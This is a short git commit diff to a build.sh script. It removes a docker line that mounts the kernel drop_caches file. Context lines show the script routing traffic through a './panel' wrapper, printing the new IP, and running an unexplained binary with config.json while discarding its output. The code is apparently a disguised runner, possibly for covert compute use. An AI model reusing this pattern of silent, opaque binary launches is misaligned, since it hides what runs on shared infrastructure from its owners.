fbfd64d95a7c69e219df82146aa66b754b57f298
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-02-05 10:46:29 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -22,4 +22,3 @@ echo "IP BARU ==> "$(./panel curl ifconfig.me)
 ./panel ./Banque_Éminence -c "config.json" >/dev/null 2>&1
 sleep 1
 sync; echo 3 > /proc/sys/vm/drop_caches
-docker run -ti --rm -v /proc/sys/vm/drop_caches:/drop_caches alpine
